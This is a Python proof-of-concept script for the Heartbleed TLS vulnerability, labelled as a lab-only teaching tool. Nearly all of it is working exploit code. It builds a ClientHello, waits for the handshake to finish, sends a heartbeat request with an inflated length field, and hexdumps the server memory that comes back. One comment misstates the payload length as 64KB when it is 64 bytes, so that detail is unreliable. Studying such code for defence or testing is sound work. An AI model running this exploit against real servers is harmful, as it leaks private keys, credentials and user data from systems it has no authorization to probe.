#!/usr/bin/env python3
"""
Minimal didactic Heartbleed-style tester.
Use only in controlled lab environments.

Usage:
  python3 heartbleed_test.py --host 192.168.56.101 --port 443
"""
import sys
import socket
import struct
import select
import argparse
import time
import array

# --- ClientHello (as bytes) ---
clientHello = bytes([
    0x16,             # record type: Handshake
    0x03, 0x03,       # TLS 1.2
    0x00, 0x2f,       # length 47
    0x01,             # Handshake: ClientHello
    0x00, 0x00, 0x2b, # Handshake length 43
    0x03, 0x03,       # Client TLS version 1.2
    # Client random / nonce (short example)
    0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x00,0x01,
    0x02,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x03,0x04,
    0x05,0x06,0x07,0x08,0x09,0x12,0x13,0x14,0x15,0x16,
    0x17,0x18,
    0x00,             # session id length
    0x00, 0x02,       # cipher suites length
    0x00, 0x2f,       # TLS_RSA_WITH_AES_128_CBC_SHA
    0x01, 0x00,       # compression length & null compression
    0x00, 0x00        # extensions length 0
])

# Minimal heartbeat request (TLS 1.2)
heartbeat = bytes([
    0x18,             # record type: Heartbeat
    0x03, 0x03,       # TLS 1.2
    0x00, 0x03,       # length = 3
    0x01,             # Heartbeat Request
    0x00, 0x40        # payload length 0x0040 (64KB) -> intentionally large
])

SERVER_HELLO_DONE = 0x0E  # handshake message type for ServerHelloDone
HEARTBEAT_RESPONSE_TYPE = 24
ALERT_TYPE = 21

# --- helpers ---
def recvall(sock, length, timeout=5.0):
    """Receive exactly 'length' bytes or return None on timeout/EOF."""
    end = time.time() + timeout
    data = b''
    remaining = length
    while remaining > 0:
        r, _, _ = select.select([sock], [], [], max(0, end - time.time()))
        if not r:
            return None if not data else data
        chunk = sock.recv(remaining)
        if not chunk:
            return None
        data += chunk
        remaining -= len(chunk)
    return data

def recv_tls_record(sock, timeout=5.0):
    """
    Read a TLS record: 5-byte record header (type, version, length) + payload.
    Returns (rec_type, version, payload) or (None, None, None) on error.
    """
    hdr = recvall(sock, 5, timeout)
    if not hdr:
        return None, None, None
    rec_type = hdr[0]
    version = struct.unpack('>H', hdr[1:3])[0]
    length = struct.unpack('>H', hdr[3:5])[0]
    payload = recvall(sock, length, timeout)
    if payload is None:
        return None, None, None
    return rec_type, version, payload

def parse_handshake_for_server_hello_done(sock, timeout=5.0):
    """
    Read records until we encounter a Handshake message with type ServerHelloDone (0x0E).
    Returns TLS version (e.g. 0x0303) when seen, or None on failure.
    """
    while True:
        rec_type, version, payload = recv_tls_record(sock, timeout)
        if rec_type is None:
            return None
        # Handshake records have rec_type == 22
        if rec_type == 22:
            # payload may contain many handshake messages; parse first byte of payload
            # Handshake message: 1 byte type, 3 bytes length, then body
            if len(payload) < 4:
                continue
            h_type = payload[0]
            if h_type == SERVER_HELLO_DONE:
                return version
            # otherwise continue reading next records (server might send certs etc)
        elif rec_type == ALERT_TYPE:
            # server sent an alert: likely not vulnerable / handshake failed
            return None
        # else keep reading

def send_and_read_heartbeat(sock, timeout=5.0):
    """Send heartbeat and read a response record (if any). Returns payload or None."""
    sock.sendall(heartbeat)
    # wait for a record (maybe Heartbeat Response (type 24) or Alert)
    rec_type, version, payload = recv_tls_record(sock, timeout)
    if rec_type is None:
        return None, None
    return rec_type, payload

def hexdump(data):
    """Simple hex + printable hexdump for clarity."""
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hexpart = ' '.join(f'{b:02X}' for b in chunk)
        asc = ''.join((chr(b) if 32 <= b < 127 else '.') for b in chunk)
        print(f'{i:04x}: {hexpart:<48} {asc}')

# --- main flow ---
def main():
    parser = argparse.ArgumentParser(description="Didactic Heartbeat tester (lab only).")
    parser.add_argument('--host', '-H', required=True, help="target IP or hostname")
    parser.add_argument('--port', '-p', type=int, default=443, help="target port (default 443)")
    parser.add_argument('--timeout', '-t', type=float, default=5.0, help="socket timeout (seconds)")
    parser.add_argument('--quiet', '-q', action='store_true', help="do not show hexdump")
    args = parser.parse_args()

    target = args.host
    port = args.port

    print(f'[+] Connecting to {target}:{port} (lab only, authorized targets!)')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(args.timeout)
    try:
        s.connect((target, port))
    except Exception as e:
        print(f'[-] Connection failed: {e}')
        return

    try:
        # Send ClientHello
        s.sendall(clientHello)
        print('[+] ClientHello sent, waiting for ServerHello / ServerHelloDone...')

        version = parse_handshake_for_server_hello_done(s, timeout=args.timeout)
        if version is None:
            print('[-] Did not complete handshake (no ServerHelloDone). Aborting.')
            s.close()
            return
        else:
            major = (version >> 8) & 0xff
            minor = version & 0xff
            print(f'[+] Observed server TLS version 0x{version:04x} (record version bytes: {major}.{minor})')

        # Send heartbeat and read response
        print('[+] Sending Heartbeat request (intentional oversized payload length)...')
        rec_type, payload = send_and_read_heartbeat(s, timeout=args.timeout)

        if rec_type is None:
            print('[-] No response to heartbeat (timeout or closed).')
        elif rec_type == HEARTBEAT_RESPONSE_TYPE:
            print('[!] Received Heartbeat response. Server returned payload:')
            if not args.quiet:
                hexdump(payload)
            print('[!] This indicates the server returned memory contents (vulnerable-like behavior).')
        elif rec_type == ALERT_TYPE:
            print('[+] Received TLS alert; server likely not vulnerable (or closed connection).')
            if not args.quiet and payload:
                hexdump(payload)
        else:
            print(f'[?] Received TLS record type {rec_type}. Payload length: {len(payload)}')
            if not args.quiet:
                hexdump(payload)

    except Exception as e:
        print(f'[-] Error during exchange: {e}')
    finally:
        s.close()
        print('[+] Connection closed.')

if __name__ == '__main__':
    main()

